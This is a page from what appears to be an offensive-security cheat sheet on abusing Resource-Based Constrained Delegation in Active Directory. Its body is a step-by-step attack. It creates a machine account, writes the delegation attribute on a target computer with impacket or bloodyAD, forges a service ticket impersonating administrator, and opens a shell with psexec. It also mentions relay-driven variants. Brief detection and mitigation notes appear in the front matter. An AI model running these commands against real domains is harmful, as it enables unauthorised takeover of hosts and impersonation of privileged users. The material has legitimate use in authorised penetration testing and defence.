---
title: Resource-Based Constrained Delegation (RBCD)
category: AD / Delegation
order: 30
tags: [delegation, rbcd, s4u, msds-allowedtoactonbehalfof, relay]
summary: >
  If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target
  computer, you make a machine account you control able to impersonate any user
  to that computer — a very common ACL/relay-driven takeover of a host.
prerequisites:
  - Write access to the target computer object (GenericWrite/GenericAll/WriteDacl or a relayed computer auth)
  - A controlled account WITH an SPN (any computer account; create one if MachineAccountQuota > 0)
tools: [impacket (rbcd.py, addcomputer, getST), bloodyAD, Rubeus, PowerMad]
detection:
  - Changes to msDS-AllowedToActOnBehalfOfOtherIdentity; new computer objects
  - S4U2Proxy (4769) from an unexpected machine account
mitigation:
  - Set MachineAccountQuota to 0; restrict who can write computer objects; Protected Users for Tier-0
refs:
  - { label: "Elad Shamir — Wagging the Dog", url: "https://eladshamir.com/2019/01/28/Wagging-the-Dog.html" }
  - { label: "HackTricks — RBCD", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" }
---

RBCD flips delegation around: the **target** decides who may act on its behalf.
Write that attribute to point at an account you control, then S4U to that
account for a ticket to the target as any user.

## 1. Get a controlled account with an SPN

```sh
# create a computer (needs MachineAccountQuota > 0, default 10)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Evil123!' \
  -dc-ip $dc_ip $domain/$user:$password
```

## 2. Write the delegation attribute on the target

```sh
# impacket
rbcd.py -delegate-from 'EVIL$' -delegate-to '$target_computer' -action write \
  -dc-ip $dc_ip $domain/$user:$password
```

```sh
# bloodyAD (clean, works well over LDAP)
bloodyAD -u $user -p $password -d $domain --host $dc_ip \
  add rbcd '$target_computer' 'EVIL$'
```

## 3. S4U → ticket to the target as administrator

```sh
getST.py -spn cifs/$target -impersonate administrator -dc-ip $dc_ip \
  'EVIL$':'Evil123!'
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass $target
```

> This is the standard follow-up to relaying a **computer** account to LDAP:
> `ntlmrelayx --delegate-access` writes the RBCD for you (see NTLM relay).
